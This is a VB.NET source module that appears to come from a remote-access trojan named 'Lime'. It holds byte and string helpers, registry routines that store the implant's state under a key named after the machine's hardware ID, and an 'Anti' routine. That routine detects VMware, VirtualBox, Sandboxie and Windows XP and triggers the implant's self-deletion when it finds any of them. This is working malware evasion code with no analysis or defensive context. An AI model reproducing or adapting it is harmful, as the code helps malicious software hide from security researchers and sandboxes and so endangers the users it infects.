Namespace Lime

    Module C_Fuctions

        Function SB(ByVal s As String) As Byte() ' string to byte()
            Return Text.Encoding.Default.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String ' byte() to string
            Return Text.Encoding.Default.GetString(b)
        End Function

        Function DLV(ByVal n As String) ' delete value in my Registry Key RG
            Try
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).DeleteValue(n)
            Catch ex As Exception
            End Try
        End Function

        Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
            Try
                Return Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).GetValue(n, "")
            Catch ex As Exception
                Return ""
            End Try
        End Function

        Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
            Try
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\" & C_ID.HWID).SetValue(n, t)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function

        Function SplitWord(ByVal b As Byte(), ByVal Word As String) As Array ' split bytes by word
            Dim a As New Collections.Generic.List(Of Byte())
            Dim M As New IO.MemoryStream
            Dim MM As New IO.MemoryStream
            Dim T As String() = Split(BS(b), Word)
            M.Write(b, 0, T(0).Length)
            MM.Write(b, T(0).Length + Word.Length, b.Length - (T(0).Length + Word.Length))
            a.Add(M.ToArray)
            a.Add(MM.ToArray)
            M.Dispose()
            MM.Dispose()
            Return a.ToArray
        End Function

        Sub Anti()
            Try
                If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) & "\vmGuestLib.dll") Then
                    C_Installation.DEL()

                ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then
                    C_Installation.DEL()

                ElseIf Diagnostics.Process.GetProcessesByName("SbieSvc").Length >= 1 Then
                    C_Installation.DEL()

                ElseIf IO.File.Exists(Environment.GetEnvironmentVariable("windir") & "\vboxmrxnp.dll") Then
                    C_Installation.DEL()
                End If
            Catch ex As Exception
            End Try
        End Sub

    End Module

End Namespace